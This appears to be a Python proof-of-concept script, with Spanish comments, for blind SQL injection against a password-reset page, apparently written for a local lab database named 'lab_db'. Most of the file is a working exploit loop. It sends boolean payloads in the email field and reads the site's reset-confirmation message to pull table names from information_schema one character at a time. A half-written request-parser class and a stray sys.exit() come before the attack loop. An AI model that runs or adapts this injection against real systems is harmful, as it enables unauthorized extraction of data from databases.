from pwn import *
from urllib.parse import urljoin
import requests, sys, time, string, argparse

class RequestParser:
    def __init__(self, file, ssl=False, marker="*"):
        self.file = file
        self.ssl = ssl
        self.marker = marker
        self.method = "GET"
        self.url = ""
        self.headers = {}
        self.body = ""
        #self.marker_location = None

    def parse_file(self):
        with open(self.file, "r", encoding="utf-8") as f:
            content = f.read()
        
        if "\n\n" in content:
            parts = content.split("\n\n", 1)

        self.headers = parts[0]
        self.body = parts [1] if len(parts) > 1 else ""

        lines = []
        for line in self.headers.splitlines():
            lines.append(line.split())

        return lines

    def makeRequest(self, payload):
        pass


url = RequestParser("r.txt")

print(url.parse_file())
#print(url.body)

sys.exit()

def main():
    parser = argparse.ArgumentParser(
        description = "PoC script",
        epilog = "Usage example: python blid_extractor.py -u http://127.0.0.1:8080/resetPassword.php"
    )

    # Definition of arguments
    parser.add_argument("-u", "--url", type=str, help="Target URL (http://example.com:8080/resetPassword.php)")

    args = parser.parse_args()

    # Basic validation
    if not args.url:
        parser.error("URL is required (-u)")

    return args.url

url = main()
characters = string.ascii_lowercase + string.digits + string.punctuation

# contenido a buscar en la base de datos, colocado en el condicional if para evaluar sus caracteres
search = "select group_concat(table_name) from information_schema.tables where table_schema='lab_db'"
#search = "database()"
#search = "SELECT group_concat(schema_name) from information_schema.schemata"

# Se definen dos variables para detectar el fin de la cadena
data0 = ""
data1 = ""

p1 = log.progress("Brute Force")
p1.status("Working...")

time.sleep(1)

p2 = log.progress("Data")

position = 0
while True:
    position += 1
    for character in characters:
        post_data = {"email": f"' or 1=1 AND if(SUBSTR(({search}),{position}, 1)='{character}', 1, 0)-- -"}

        p1.status(post_data['email'])

        r = requests.post(url, data = post_data)

        if "A password reset link has been sent to your email address." in r.text:
            
            data0 += character
            p2.status(data0)
            break

    if data0 == data1: break
    data1 = data0
